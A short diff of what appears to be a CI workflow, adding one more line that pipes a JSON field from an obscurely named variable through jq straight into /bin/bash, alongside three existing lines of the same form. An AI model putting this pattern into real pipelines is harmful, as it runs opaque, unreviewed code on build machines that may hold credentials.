@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$rs990" | jq -r .aj0 | /bin/bash
           echo $szp96 | jq -r .u2223 | /bin/bash
           echo $ph2 | jq -r .wwk1680 | /bin/bash
+          echo $cy2400 | jq -r .a513 | /bin/bash
 
       - name: Save archive
         if: always()
